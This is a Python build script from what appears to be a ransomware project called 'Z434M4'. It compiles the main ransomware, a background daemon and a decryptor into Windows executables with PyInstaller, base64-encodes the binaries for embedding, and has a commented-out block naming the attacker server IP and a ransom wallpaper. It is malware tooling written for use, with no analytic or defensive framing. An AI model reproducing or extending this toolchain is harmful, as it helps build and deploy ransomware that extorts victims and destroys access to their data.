#!/usr/bin/env python

import argparse
import base64
import os
import sys
import shutil

"""
parser = argparse.ArgumentParser(description='Build Z434M4.', add_help=True)
parser.add_argument('-i', '--ip', type=str, required=True, metavar='[FILE]',
    help='Ip address of the server. Z434M4 will try to connect to')
parser.add_argument('-p', '--port', type=str, required=False, metavar='[FILE]',
    help='Port of the server.')
parser.add_argument('-I', '--img', type=str, required=False, metavar='[FILE]',
    help='Img to change wallpaper and display on Z434M4 execution.')
args = parser.parse_args()
"""


def error(s):
    print(s)
    sys.exit(-1)


def build(program):
    # Use os.path.join for Windows path compatibility
    ransomware_dir = os.path.join(os.getcwd(), "Ransomware")
    script_path = os.path.join(ransomware_dir, f"{program}.py")
    project_dir = os.getcwd()
    
    if not os.path.exists(script_path):
        error(f"Script {script_path} not found")
    
    # Windows-compatible PyInstaller command with distpath set to project directory
    # --distpath specifies where to put the executable
    command = f'pyinstaller -F --clean --noconsole "{script_path}" -n {program} --distpath "{project_dir}"'
    print(f"Running: {command}")
    os.system(command)

    # Read the binary data with updated path (now in project root)
    exe_path = os.path.join(project_dir, f"{program}.exe")
    try:
        with open(exe_path, 'rb') as f:
            binary_data = f.read()
            output64 = base64.b64encode(binary_data)
    except Exception as e:
        error(f'{program} binary doesn\'t exist, compilation failed: {str(e)}')

    # Write base64 data to project directory
    output_path = os.path.join(project_dir, f"base64{program}")
    with open(output_path, 'wb') as f:
        f.write(output64)
    
    print(f"Successfully built {program}")
    return output64


def build_Z434M4():
    print("Building Z434M4 ransomware...")
    return build('main')  # Using main.py for the main ransomware component


def build_decryptor():
    print("Building decryptor...")
    return build('decryptor')


def build_daemon():
    print("Building daemon...")
    return build('daemon')


def change_Z434M4_binaries():
    # This function should update the variables.py file
    # with the base64-encoded binaries
    print("Updating variables.py with new binaries...")
    variables_path = os.path.join(os.getcwd(), "Ransomware", "variables.py")
    
    if not os.path.exists(variables_path):
        error("variables.py not found")
    
    # Read current variables file
    with open(variables_path, 'r') as f:
        variables_content = f.read()
    
    # Update with new binaries (if this function gets implemented)
    # For now, just printing a warning
    print("Warning: change_Z434M4_binaries() is not fully implemented")


def clean_dist():
    """Clean build artifacts"""
    print("Cleaning build artifacts...")
    # Remove PyInstaller build artifacts but keep the executables
    directories_to_clean = ['build', '__pycache__']
    files_to_clean = [f for f in os.listdir() if f.endswith('.spec')]
    
    for directory in directories_to_clean:
        if os.path.exists(directory):
            try:
                shutil.rmtree(directory)
                print(f"Removed {directory}")
            except Exception as e:
                print(f"Error removing {directory}: {str(e)}")
    
    for file in files_to_clean:
        try:
            os.remove(file)
            print(f"Removed {file}")
        except Exception as e:
            print(f"Error removing {file}: {str(e)}")


def main():
    # Build each component
    decryptor64 = build_decryptor()
    daemon64 = build_daemon()
    Z434M4_64 = build_Z434M4()
    
    print("\nBuild process complete!")
    print("--------------------------------------")
    print("The following files were created:")
    print("- main.exe - Main ransomware executable")
    print("- daemon.exe - Background process executable")
    print("- decryptor.exe - Decryption tool executable")
    print("- base64main - Base64 encoded main binary")
    print("- base64daemon - Base64 encoded daemon binary")
    print("- base64decryptor - Base64 encoded decryptor binary")
    print("--------------------------------------")


if __name__ == '__main__':
    main()
    # Uncomment to clean up after building:
    # clean_dist()